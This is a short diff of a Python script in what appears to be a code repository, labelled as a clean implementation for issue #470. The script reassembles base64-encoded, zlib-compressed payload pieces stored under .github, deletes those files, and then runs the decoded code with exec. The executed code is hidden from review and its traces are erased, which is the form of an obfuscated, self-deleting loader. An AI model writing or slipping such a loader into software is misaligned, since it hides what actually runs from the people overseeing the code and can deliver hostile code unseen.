@@ -6,11 +6,13 @@ import zlib
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[2]
-PARTS = sorted((ROOT / '.github/development-packages').glob('issue470-clean.payload.*'))
+PACKAGE_DIR = ROOT / '.github/development-packages'
+PARTS = sorted(PACKAGE_DIR.glob('issue470-clean-v2.payload.*'))
 if not PARTS:
-    raise SystemExit('Issue #470 clean implementation payload is missing')
+    raise SystemExit('Issue #470 corrected clean implementation payload is missing')
 encoded = ''.join(part.read_text(encoding='utf-8') for part in PARTS)
 code = zlib.decompress(base64.b64decode(encoded)).decode('utf-8')
-for part in PARTS:
-    part.unlink(missing_ok=True)
+for pattern in ('issue470-clean.payload.*', 'issue470-clean-v2.payload.*'):
+    for part in PACKAGE_DIR.glob(pattern):
+        part.unlink(missing_ok=True)
 exec(compile(code, __file__, 'exec'))
